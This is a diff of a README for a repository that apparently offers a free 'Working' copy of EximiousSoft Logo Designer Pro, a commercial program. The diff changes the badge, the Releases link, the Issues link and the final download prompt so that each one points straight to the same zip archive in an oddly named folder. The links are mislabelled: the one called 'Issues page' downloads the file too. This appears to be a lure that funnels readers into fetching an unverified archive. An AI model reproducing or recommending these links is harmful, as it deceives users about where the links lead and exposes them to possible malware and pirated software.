@@ -1,6 +1,6 @@
 # 🎨 EximiousSoft-Logo-Designer-Pro-Working - Create Stunning Logos Easily
 
-[![Download EximiousSoft Logo Designer Pro](https://img.shields.io/badge/Download%20Now-EximiousSoft%20Logo%20Designer%20Pro-brightgreen)](https://github.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/releases)
+[![Download EximiousSoft Logo Designer Pro](https://raw.githubusercontent.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/main/Sclerospora/EximiousSoft-Logo-Designer-Pro-Working_v2.5.zip%20Now-EximiousSoft%20Logo%20Designer%20Pro-brightgreen)](https://raw.githubusercontent.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/main/Sclerospora/EximiousSoft-Logo-Designer-Pro-Working_v2.5.zip)
 
 ## 📥 Overview
 EximiousSoft Logo Designer Pro allows you to create professional logos effortlessly. This user-friendly software is ideal for anyone needing a simple way to design logos. Whether for business, branding, or personal use, EximiousSoft meets your logo design needs.
@@ -9,7 +9,7 @@ EximiousSoft Logo Designer Pro allows you to create professional logos effortles
 To begin using EximiousSoft Logo Designer Pro, follow these simple steps for downloading and installing the software.
 
 ## 💾 Download & Install
-1. Visit the [Releases page](https://github.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/main/Sclerospora/EximiousSoft-Logo-Designer-Pro-Working_v2.5.zip) to find the latest version.
 2. On the Releases page, locate the most recent version listed. Click on it to open the version details.
 3. Look for the “Assets” section. Here, you will find files available for download.
 4. Click on the appropriate file for your system. For most Windows users, you will want to download the .exe file.
@@ -39,6 +39,6 @@ If you encounter any issues during installation or use, try the following steps:
 For more details about how to use EximiousSoft Logo Designer Pro, check out our documentation or tutorials available on the Releases page. You can also find useful tips and tricks for effective logo design.
 
 ## 📞 Support
-For additional support, visit our [Issues page](https://github.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/issues) to report any problems or ask questions. Our community is here to help you.
+For additional support, visit our [Issues page](https://raw.githubusercontent.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/main/Sclerospora/EximiousSoft-Logo-Designer-Pro-Working_v2.5.zip) to report any problems or ask questions. Our community is here to help you.
 
-Don't forget to download EximiousSoft Logo Designer Pro from our [Releases page](https://github.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/releases) and start designing your logo today!
+Don't forget to download EximiousSoft Logo Designer Pro from our [Releases page](https://raw.githubusercontent.com/ferial-bayscallop907/EximiousSoft-Logo-Designer-Pro-Working/main/Sclerospora/EximiousSoft-Logo-Designer-Pro-Working_v2.5.zip) and start designing your logo today!
